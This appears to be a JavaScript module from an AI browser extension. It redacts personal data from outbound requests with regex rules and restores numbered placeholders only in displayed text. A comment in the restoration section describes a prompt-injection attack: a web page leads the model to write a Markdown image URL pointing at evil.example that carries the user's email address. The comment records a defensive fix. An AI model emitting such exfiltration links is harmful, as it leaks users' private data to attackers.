  [/(?<![\w.+])\+?1[ .-]?\(?[2-9]\d{2}\)?[ .-]?[2-9]\d{2}[ .-]?\d{4}(?![\d])/g, "[PHONE]"],
  // UK national format: 07911 123456, 07911123456, 020 7946 0958, 0121 496 0123, 01632 960123.
  [/(?<![\w.])0?7\d{3}[ -]?\d{6}(?![\d])/g, (m) => (m.startsWith("0") || /^7\d{3}[ -]/.test(m) ? "[PHONE]" : m)],
  [/(?<![\w.])\(?0[1-3]\d{1,3}\)?[ -]\d{3,4}[ -]\d{3,4}(?![\d])/g, "[PHONE]"],
  [/(?<![\w.])0\d{4}[ -]\d{6}(?![\d])/g, "[PHONE]"],
  [/(?<![\d])(?:\+?86[ -]?)?1[3-9]\d[ -]?\d{4}[ -]?\d{4}(?![\d])/g, "[PHONE]"],
  [/(?<![\d])0\d{2,3}[ -]\d{7,8}(?![\d])/g, "[PHONE]"],
  [/(?<![\w])\+\d{1,3}[ .-]?\(?\d{1,4}\)?(?:[ .-]?\d{2,4}){2,4}(?![\d])/g, "[PHONE]"],
  [/(?<![\d])\(?\d{3}\)?[ .-]\d{3}[ .-]\d{4}(?![\d])/g, "[PHONE]"],
  // French (06 12 34 56 78), Japanese (090-1234-5678), Taiwanese
  // (0912-345-678) and Spanish (612 345 678) mobile/landline shapes - the
  // UI's six languages. These run before the SIN rule (see below), so a
  // Spanish mobile is a [PHONE], not a [SIN].
  [/(?<![\w.])0[1-9](?:[ .-]\d{2}){4}(?!\d)/g, "[PHONE]"],
  // Japanese landline (03-1234-5678, 06 1234 5678, solid 0312345678): the two
  // 2-digit area codes 03/06, then 4+4 (10 digits total). Overlaps with the UK
  // and other shapes are harmless - everything matching a phone shape becomes
  // [PHONE].
  [/(?<![\w.])0[36][ -]?\d{4}[ -]?\d{4}(?!\d)/g, "[PHONE]"],
  [/(?<![\w.])0[789]0[- ]?\d{4}[- ]?\d{4}(?!\d)/g, "[PHONE]"],
  [/(?<![\w.])09\d{2}[- ]?\d{3}[- ]?\d{3}(?!\d)/g, "[PHONE]"],
  [/(?<![\w.])[67]\d{2}[- ]?\d{3}[- ]?\d{3}(?!\d)/g, "[PHONE]"],
  // A bare 10-digit North American number (4155550132).
  [/(?<![\w.\-/:#$,])[2-9][0-8]\d[2-9]\d{6}(?![\w]|[.,]\d)/g, redactBareNanp],
  // Canadian SIN: 9 digits, solid or grouped 3-3-3 with one space/hyphen
  // between groups, Luhn-checked so ordinary 9-digit numbers stay. (046 454
  // 286 is a valid SIN, so the first digit is deliberately not limited.)
  // Runs AFTER the phone rules: a Spanish mobile (640 123 456) has the same
  // shape and must be a [PHONE], not a [SIN]. Digits directly after a "/" are
  // a URL path segment, not a SIN.
  [/(?<![\w.])\d{3}([ \xa0-]?)\d{3}\1\d{3}(?!\w|\.\d)/g, (m, sep, offset, whole) => {
    if (offset > 0 && whole[offset - 1] === "/") return m;
    // The grouped 3-3-3 form is how a SIN is written. A SOLID 9-digit run that
    // passes Luhn is ~10% of all solid 9-digit runs (order and reference
    // numbers), so it only redacts behind a cue ("SIN: 046454286"). (The
    // parameter names used to be wrong - with the capture group the second
    // argument IS the separator, so the URL guard above never fired.)
    if (!sep && !/\b(?:sin|social insurance(?: number)?)\s*[:：#]?\s*$/i.test(whole.slice(Math.max(0, offset - 40), offset))) return m;
    return luhnValid(m.replace(/\D/g, "")) ? "[SIN]" : m;
  }],

  // --- network ---
  [IPV6_CANDIDATE_RE, redactIPv6],
  [/(?<![\w:-])(?:[0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}(?![\w:-])/g, "[MAC_ADDRESS]"],
  [/(?<![\w.])(?=[0-9a-f.]*[a-f])[0-9a-f]{4}\.[0-9a-f]{4}\.[0-9a-f]{4}(?![\w.])/gi, "[MAC_ADDRESS]"],
  // "Version 1.2.3.4" / "v2.0.1.5" look like IPv4 addresses but are not.
  [/(?<![\d.])(?:(?:25[0-5]|2[0-4]\d|1?\d?\d)\.){3}(?:25[0-5]|2[0-4]\d|1?\d?\d)(?![\d.])/g, (m, offset, whole) => (/(?:\bversion|\bver\.?|\bv|版本|\brelease|\bbuild)\s*:?\s*$/i.test(whole.slice(Math.max(0, offset - 14), offset)) ? m : "[IP_ADDRESS]")],

  // --- personal details ---
  // Runs before the name rules: "Name: John Smith Date of birth: ..." would
  // otherwise have "Date" swallowed as part of the name, hiding the label.
  [new RegExp(`(${DOB_LABEL}\\s*(?:[:=：]\\s*)?)(?:${DOB_DATE})(?!\\d)`, "gi"), "$1[DATE_OF_BIRTH]"],
  // Canadian postal code (A1A 1A1). Real codes never start with D F I O Q U W Z
  // and never use D F I O Q U in the other two letter slots.
  [/(?<![A-Za-z0-9])[ABCEGHJ-NPRSTVXY]\d[ABCEGHJ-NPRSTV-Z][ -]?\d[ABCEGHJ-NPRSTV-Z]\d(?![A-Za-z0-9])/gi, "[POSTAL_CODE]"],

  // --- street addresses ---
  [US_ADDRESS_RE, "[ADDRESS]"],
  [CN_ADDRESS_RE, "[ADDRESS]", (s) => /[路街道巷弄同]/.test(s)],
  // prefilter: the rule requires one of these suffix characters; without
  // them the greedy region-grouping backtracks catastrophically on runs of
  // 区/市/县 (16k 区 = 4.3s).
  // UK postcodes (SW1A 2AA, M1 1AE, EC1A1BB).
  [/(?<![A-Za-z0-9])[A-Z]{1,2}\d[A-Z\d]?\s?\d[A-Z]{2}(?![A-Za-z0-9])/g, "[POSTAL_CODE]"],

  // --- names (only with a clear cue) ---
  // "John Smith <john@x.com>" - but not "Please Contact Support Team <help@x.com>".
  [new RegExp(`("?)(${NAME_SEQ})("?)(\\s*<\\[EMAIL(?:#\\d+)?\\]>)`, "g"), (m, q1, seq, q2, tail) => {
    const parts = splitNameSeq(seq);
    return parts ? `${q1}${parts.lead.length ? `${parts.lead.join(" ")} ` : ""}[NAME]${q2}${tail}` : m;
  }],
  // Case-sensitive on purpose: with an "i" flag [A-Z] matches any letter, so
  // "this is very important" used to become "this is [NAME] ...". "this is" was
  // dropped altogether (far too common in ordinary prose).
  [new RegExp(`((?:\\b[Mm]y name is|\\bI am called|\\bI'm called|\\bI’m called)\\s+)${NAME_SEQ}`, "g"), "$1[NAME]"],
  [new RegExp(`(\\b(?:[Ff][Uu][Ll][Ll][ _-]?[Nn][Aa][Mm][Ee]|[Ff][Ii][Rr][Ss][Tt][ _-]?[Nn][Aa][Mm][Ee]|[Ll][Aa][Ss][Tt][ _-]?[Nn][Aa][Mm][Ee]|[Ss][Uu][Rr][Nn][Aa][Mm][Ee]|[Nn][Aa][Mm][Ee]|[Cc][Oo][Nn][Tt][Aa][Cc][Tt]|[Cc][Uu][Ss][Tt][Oo][Mm][Ee][Rr]|[Cc][Ll][Ii][Ee][Nn][Tt]|[Pp][Aa][Tt][Ii][Ee][Nn][Tt]|[Cc][Aa][Rr][Dd][Hh][Oo][Ll][Dd][Ee][Rr]|[Rr][Ee][Cc][Ii][Pp][Ii][Ee][Nn][Tt]|[Ss][Ee][Nn][Dd][Ee][Rr]|[Aa][Uu][Tt][Hh][Oo][Rr]|[Aa][Pp][Pp][Ll][Ii][Cc][Aa][Nn][Tt]|[Ee][Mm][Pp][Ll][Oo][Yy][Ee][Ee])\\s*[:=]\\s*)(${NAME_SEQ})`, "g"), (m, head, seq, offset, whole) => (
    splitNameSeq(seq) && !NON_PERSON_LABEL_RE.test(whole.slice(Math.max(0, offset - NON_PERSON_LABEL_WINDOW), offset)) ? `${head}[NAME]` : m
  )],
  [new RegExp(`(\\b(?:Dear|Hi|Hello|Hey|Regards,|Sincerely,|Best,|Thanks,|Cheers,)\\s+)(${NAME_SEQ_SHORT})`, "g"), (m, cue, name) => (isGenericTarget(name.split(/\s+/)[0]) ? m : `${cue}[NAME]`)],
  [new RegExp(`(\\b(?:Mr|Mrs|Ms|Miss|Dr|Prof)\\.?\\s+)(${NAME_SEQ})`, "g"), (m, title, name) => (
    TITLE_BRAND_WORDS.has(name.split(/\s+/)[0].toLowerCase()) ? m : `${title}[NAME]`
  )],
  [/((?:姓名|名字|联系人|收件人|寄件人|持卡人|客户|申请人|患者|用户名)\s*[:：]\s*)[一-龥·]{2,5}/g, "$1[NAME]"],
  [/((?:我叫|我的名字是|本人)\s*)[一-龥·]{2,4}/g, "$1[NAME]"],
  [new RegExp(`[${CN_SURNAMES}][一-龥]?(?=先生|女士|小姐)`, "g"), "[NAME]"],
  [new RegExp(`[${CN_SURNAMES}](?=老师|经理|总监|医生|教授|博士)`, "g"), "[NAME]"],
];

// ---------- numbered placeholders + local mapping ----------
//
// Within one request every distinct value gets its own numbered placeholder
// ([EMAIL#1], [EMAIL#2], [PHONE#1] ...), the same value always gets the same one,
// and the mapping lives in memory in this session object. It never goes to a
// provider or to Tavily; the only place it is sent is the extension's own side
// panel (over the runtime port), which uses it to show the user their own values
// again (see restoreInHtmlText / restoreWithMap), so a translation or summary
// shows the user's own email address, not "[EMAIL#1]".
export function createRedactionSession() {
  // reserved: numbers already used by literal placeholder-shaped text in the
  // source, so a generated placeholder never reuses one and the restorer can
  // leave the literal token untouched.
  return { byKey: new Map(), byPlaceholder: new Map(), counters: new Map(), reserved: new Map() };
}

function reservePlaceholders(text, session) {
  if (!session || typeof text !== "string" || !text.includes("[")) return;
  for (const match of text.matchAll(PLACEHOLDER_RE)) {
    const type = match[1];
    const number = Number(match[2]);
    let reserved = session.reserved.get(type);
    if (!reserved) {
      reserved = new Set();
      session.reserved.set(type, reserved);
    }
    reserved.add(number);
  }
}

function placeholderFor(session, type, original) {
  const key = `${type}\u0000${original}`;
  let ph = session.byKey.get(key);
  if (!ph) {
    let n = (session.counters.get(type) || 0) + 1;
    const reserved = session.reserved.get(type);
    while (reserved?.has(n)) n++;
    session.counters.set(type, n);
    ph = `[${type}#${n}]`;
    session.byKey.set(key, ph);
    session.byPlaceholder.set(ph, original);
  }
  return ph;
}

// Expands "$1[NAME]$3" style replacement strings the same way String.replace does.
function expandReplacement(rep, args) {
  return rep.replace(/\$(\d)/g, (_, n) => args[Number(n)] ?? "");
}

// `full` was replaced by `replaced`; give the placeholder that appeared in its
// place a number and remember what it stands for.
function numberPlaceholder(full, replaced, session) {
  if (full === replaced) return replaced;
  let p = 0;
  const max = Math.min(full.length, replaced.length);
  while (p < max && full[p] === replaced[p]) p++;
  let s = 0;
  while (s < max - p && full[full.length - 1 - s] === replaced[replaced.length - 1 - s]) s++;
  // The maximal common prefix/suffix can eat into the placeholder itself:
  // "Cookie:[9" -> "Cookie:[COOKIE]" shares the source's literal "[" with the
  // replacement's "[", so the prefix cut leaves "COOKIE]" and the plain,
  // UNNUMBERED "[COOKIE]" went out unrestorable. Locate the replacement's
  // placeholder token directly (the LAST "[" at or before the prefix cut and
  // the FIRST "]" after it) and require it to sit inside the common
  // prefix/suffix window.
  const open = replaced.lastIndexOf("[", p);
  const close = open >= 0 ? replaced.indexOf("]", open) : -1;
  if (
    open >= 0 && close >= 0 &&
    replaced.length - 1 - close <= s &&
    /^\[[A-Z_]+\]$/.test(replaced.slice(open, close + 1))
  ) {
    const originalPart = full.slice(open, full.length - (replaced.length - 1 - close));
    if (originalPart) {
      const type = /^\[([A-Z_]+)\]$/.exec(replaced.slice(open, close + 1))[1];
      return replaced.slice(0, open) + placeholderFor(session, type, originalPart) + replaced.slice(close + 1);
    }
  }
  return replaced; // unusual shape: keep the plain placeholder
}

// With a session, placeholders are numbered and remembered; without one the
// plain placeholders ([EMAIL]) are produced.
export function redactSensitive(text, session = null) {
  if (typeof text !== "string" || !text) return text;
  // Reserve literal placeholder-shaped tokens BEFORE any rule runs, so a real
  // value never gets the same number as text such as "use [EMAIL#1] literally".
  reservePlaceholders(text, session);
  let out = text;
  for (const [re, rep, pre] of RULES) {
    // A cheap prefilter (the CN address rule) can skip a rule whose
    // expensive regex cannot possibly match the current text.
    if (pre && !pre(out)) continue;
    if (!session) {
      out = out.replace(re, rep);
      continue;
    }
    out = out.replace(re, (...args) => {
      const full = args[0];
      const replaced = typeof rep === "function" ? rep(...args) : expandReplacement(rep, args);
      return typeof replaced === "string" ? numberPlaceholder(full, replaced, session) : replaced;
    });
  }
  return out;
}

const PLACEHOLDER_RE = /\\?\[([A-Z_]+)#(\d+)\\?\]/g;

// Puts the real values back into text that contains this session's placeholders.
// Unknown placeholders are left as they are. Originals can themselves contain
// placeholders (a later rule saw an earlier one), so this repeats a few times.
export function restorePlaceholders(text, session) {
  if (typeof text !== "string" || !text || !session || !session.byPlaceholder.size) return text;
  let out = text;
  for (let i = 0; i < 3; i++) {
    const next = out.replace(PLACEHOLDER_RE, (m, type, n) => session.byPlaceholder.get(`[${type}#${n}]`) ?? m);
    if (next === out) break;
    out = next;
  }
  return out;
}

// Restores ONLY [NAME#n] placeholders. Used ONLY for a web search the user
// explicitly asked for: a search about a public figure is useless with the name
// blinded, while every other redaction stays in place. It must never be used for
// an automatic (implicit) lookup - the user did not ask for that search, so a
// name in their question is not theirs to be shared with the search service
// (background.js skips such a lookup instead). A fact-check request is handled
// differently - the whole claim is sent unfiltered (see background.js).
export function restoreNamePlaceholders(text, session) {
  if (typeof text !== "string" || !text || !session || !session.byPlaceholder.size || !text.includes("[NAME#")) return text;
  return text.replace(/\[NAME#\d+\]/g, (token) => session.byPlaceholder.get(token) ?? token);
}

// ---------------------------------------------------------------------------
// Restoring placeholders in what the USER SEES (done by the side panel).
//
// The worker no longer puts real values back into the streamed reply. It used
// to, before Markdown was parsed, so a page that talked the model into writing
// ![x](https://evil.example/?d=[EMAIL#1]) got a URL holding the real address,
// and the panel then offered to fetch / open exactly that URL. Now the reply
// travels with its placeholders, together with the placeholder -> value map
// (extension-internal, over the port), and the panel restores values only
//   - in TEXT (text nodes of the rendered reply, plain-text translations, the
//     copy button), never in a link target or an image URL;
//   - in an image's alt text (display text, not an address).
// A URL that holds a placeholder keeps it literally, so nothing private can
// leave through a click.
// ---------------------------------------------------------------------------

const PLACEHOLDER_KEY_RE = /^\[[A-Z_]+#\d+\]$/;
const MAX_PII_MAP_ENTRIES = 1000;
const MAX_PII_VALUE_CHARS = 2000;

// The session's placeholder -> original map as a plain object (for the port).
export function placeholderMapFromSession(session) {
  if (!session || !session.byPlaceholder?.size) return null;
  return Object.fromEntries(session.byPlaceholder);
}

// Validates a map that came from the port or from storage / a backup.
export function sanitizePiiMap(raw) {
  if (!raw || typeof raw !== "object" || Array.isArray(raw)) return null;
  const out = {};
  let n = 0;
  for (const [key, value] of Object.entries(raw)) {
    if (n >= MAX_PII_MAP_ENTRIES) break;
    if (!PLACEHOLDER_KEY_RE.test(key) || typeof value !== "string" || value.length > MAX_PII_VALUE_CHARS) continue;
    out[key] = value;
    n++;
  }
  return n ? out : null;
}

// The part of `map` that `text` needs (its placeholders, and those inside their
// values), so a stored message keeps only what it uses.
export function usedPiiMap(text, map) {
  if (!map || typeof text !== "string" || !text.includes("[")) return null;
  const out = {};
  let frontier = text;
  for (let depth = 0; depth < 4 && frontier; depth++) {
    let next = "";
    for (const m of frontier.matchAll(PLACEHOLDER_RE)) {
      const key = `[${m[1]}#${m[2]}]`;
      if (key in out || !(key in map)) continue;
      out[key] = map[key];
      next += `${map[key]}\n`;
    }
    frontier = next;
  }
  return Object.keys(out).length ? out : null;
}

function sessionFromMap(map) {
  return { byPlaceholder: new Map(Object.entries(map)) };
}

// Plain-text restore (a translation shown with textContent, the copy source,
// history sent back to the worker - which redacts it again).
export function restoreWithMap(text, map) {
  if (!map || typeof text !== "string" || !text.includes("[")) return text;
  return restorePlaceholders(text, sessionFromMap(map));
}

const HTML_TEXT_ESCAPES = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" };
const escapedSessions = new WeakMap(); // map -> session whose values are HTML-escaped

// Restores placeholders in the TEXT NODES of an HTML string produced by
// markdownToHtml(): every "<" of the reply's own text is already "&lt;", so a
// literal "<...>" in the string is a tag the renderer generated. Tags are left
// alone, with one exception: an image's alt text (shown as a label, never
// requested). href / src - every address - keep their placeholders. Restored
// values are HTML-escaped, so a value can never become markup.
export function restoreInHtmlText(html, map) {
  if (!map || typeof html !== "string" || !html.includes("[")) return html;
  let session = escapedSessions.get(map);
  if (!session) {
    session = { byPlaceholder: new Map(Object.entries(map).map(([k, v]) => [k, v.replace(/[&<>"']/g, (c) => HTML_TEXT_ESCAPES[c])])) };
    escapedSessions.set(map, session);
  }
  if (!session.byPlaceholder.size) return html;
  return html.replace(/<[^>]*>|[^<]+/g, (segment) => {
    if (segment[0] !== "<") return restorePlaceholders(segment, session);
    return segment.replace(/(\balt=")([^"]*)(")/, (_m, open, value, close) => `${open}${restorePlaceholders(value, session)}${close}`);
  });
}

// Single choke point for EVERYTHING in an ASK payload that can leave the
// browser (provider requests and Tavily queries are both built from these
// fields). Every string leaf is redacted, so a field added to the payload later
// (e.g. factCheck.selectedText, which previously bypassed the filter) is
// covered by default. Structural keys and binary image fields are left alone.
const STRUCTURAL_KEYS = new Set(["role", "type", "id", "requestId", "modelId", "tabId", "kind"]);
const NON_TEXT_KEYS = new Set(["images", "dataUrl", "imageUrls", "pageScreenshot"]);

function walkText(value, key, visit) {
  if (NON_TEXT_KEYS.has(key)) return;
  if (typeof value === "string") {
    visit(value);
    return;
  }
  if (Array.isArray(value)) {
    for (const item of value) walkText(item, key, visit);
    return;
  }
  if (value && typeof value === "object") {
    for (const [childKey, childValue] of Object.entries(value)) walkText(childValue, childKey, visit);
  }
}

function deepRedact(value, key, session) {
  if (NON_TEXT_KEYS.has(key)) return value;
  if (typeof value === "string") return STRUCTURAL_KEYS.has(key) ? value : redactSensitive(value, session);
  if (Array.isArray(value)) return value.map((v) => deepRedact(v, key, session));
  if (value && typeof value === "object") {
    const out = {};
    for (const [k, v] of Object.entries(value)) out[k] = deepRedact(v, k, session);
    return out;
  }
  return value;
}

export function redactOutbound(payload, session = null) {
  if (!payload || typeof payload !== "object") return payload;
  // Reserve every literal placeholder-shaped token in the whole payload BEFORE
  // any field is redacted, so a question and a page/history field cannot each
  // start number assignment at #1.
  if (session) walkText(payload, undefined, (text) => reservePlaceholders(text, session));
  const out = {};
  for (const [key, value] of Object.entries(payload)) {
    out[key] = NON_TEXT_KEYS.has(key) || STRUCTURAL_KEYS.has(key)
      ? value
      : deepRedact(value, key, session);
  }
  return out;
}
